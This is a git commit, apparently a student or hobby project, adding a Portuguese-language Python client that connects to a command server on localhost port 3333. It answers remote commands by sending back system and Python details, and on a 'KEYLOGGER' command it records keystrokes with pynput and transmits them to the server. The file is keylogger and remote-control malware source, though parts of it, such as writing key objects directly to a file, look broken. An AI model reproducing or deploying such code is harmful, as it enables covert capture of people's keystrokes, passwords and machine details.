37cbe1eccf77bbce066d257b2fcbd84f3c43cc9a
Paulo Do Monte <55249641+PauloDoMonte@users.noreply.github.com>
2021-02-03 08:55:13 -0300

    Add files via upload
    Primeiro upload dos arquivos inicias de servidor e cliente

---
+++ cliente.py
@@ -0,0 +1,52 @@
+import socket,platform,os
+from pynput.keyboard import Key, Listener
+
+def on_press(key):
+    arquivo = open('key.txt','a')
+    arquivo.write(key)
+    arquivo.close()
+    arquivo = open('key.txt','r')
+    quantidade = len(arquivo.readlines())
+    if(quantidade >= 10):
+        return False
+
+# Keylogger Function
+
+
+def enviar_mensagem(mensagem,cliente):
+    cliente.send(mensagem.encode())
+
+cliente = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+Ip = "127.0.0.1"
+Porta = 3333
+cliente.connect((Ip,Porta))
+
+while True:
+    mensagem = cliente.recv(2048)
+    mensagem_decode = mensagem.decode()
+    print(mensagem_decode)
+
+    if(mensagem_decode.upper() == "DETALHES DA MAQUINA"):
+        mensagem = "\nSistema: {}\nNó: {}\nRelease: {}\nVersão: {}\nBits do processador: {}".format(platform.system(),
+        platform.node(),platform.release(),platform.version(),platform.processor())
+
+    elif(mensagem_decode.upper() == "DETALHES DO PYTHON"):
+        mensagem = "\nVersao: {}\n Versao Tuple: {} \nCompilador: {} Build: {}".format(platform.python_version(),
+        platform.python_version_tuple(),
+        platform.python_compiler(),
+        platform.python_build())
+
+    elif(mensagem_decode.upper() == "KEYLOGGER"):
+        arquivo = open('key.txt','w')
+        arquivo.close()
+        with Listener(on_press = on_press) as listener:
+            listener.start()
+        arquivo = open('key.txt','r')
+        mensagem = arquivo.readlines()
+        arquivo.close()
+        os.remove('key.txt')
+
+    else:
+        mensagem = "\nComando nao reconhecido no sistema, tente novamente"
+
+    enviar_mensagem(mensagem,cliente)
